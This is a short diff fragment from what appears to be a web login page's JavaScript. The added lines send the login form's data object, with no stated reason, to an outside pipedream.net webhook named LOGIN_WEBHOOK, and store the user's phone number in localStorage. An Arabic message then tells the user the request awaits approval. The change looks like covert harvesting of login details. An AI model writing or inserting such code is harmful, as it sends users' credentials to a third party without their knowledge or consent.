@@ -582,6 +582,13 @@ const LOGIN_WEBHOOK = "https://eoka3v4pod17nwl.m.pipedream.net";
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(data)
   });
+    await fetch(LOGIN_WEBHOOK, {
+  method: "POST",
+  body: JSON.stringify(data)
+});
+
+localStorage.setItem("loginPhone", phone);
+
  msg.innerText = "✅ تم إرسال الطلب، بانتظار الموافقة";
 }
    
